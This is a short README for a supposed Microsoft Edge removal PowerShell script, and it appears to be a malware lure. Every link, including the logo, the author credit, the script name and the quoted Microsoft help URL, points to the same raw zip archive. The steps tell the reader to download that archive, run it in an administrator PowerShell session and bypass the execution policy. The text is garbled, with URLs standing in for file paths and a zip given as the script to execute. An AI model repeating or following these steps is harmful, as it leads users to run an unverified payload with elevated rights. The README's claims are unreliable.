## Edge Remover
![Logo](https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip)  
icon by @WindowsRefundDay(https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip)

## Introduction
Microsoft Edge Remover is a tool designed to help Windows users remove Microsoft Edge Chromium and Edge UWP from their devices.

## System Requirements

 - The Microsoft Edge Remover tool requires a Windows operating system to function. It is compatible with Windows 10 (all versions) and Windows 11. Before using the tool, it is important to ensure that the user's device meets the system requirements. This will ensure that the tool runs smoothly and effectively removes Microsoft Edge Chromium and Edge UWP. The tool may also require administrator permission to run, depending on the user's version of Windows. By having the correct system requirements, users can be confident that the Microsoft Edge Remover tool will work efficiently on their device.



## Using the script
__ATTENTION!__ Before using the script you must check nexr things:
 <li> If you applied EdgeBlocker (Sordum software) before to apply this script, you must disable or undo modifications before to apply this script.

Download the script from the Releases to some folder: `C:\path\to\file\https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip`
To run the script start a PowerShell session as administrator (right click --> "Run as administrator").
Go to the path: `cd 'C:\path\to\file\`
Run the script: `.\https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip`

If you get an error like:
```
https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip is not digitally signed. You cannot run this script on the current system. For
more information about running scripts and setting execution policy, see about_Execution_Policies at
https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip
```

Run the command instead with bypassing of the ExecutionPolicy: 
`powershell -ExecutionPolicy Bypass -File .\https://github.com/shivamkumar254456/edge-remover/raw/refs/heads/main/disablEdgeUpdates/remover-edge-1.2.zip`
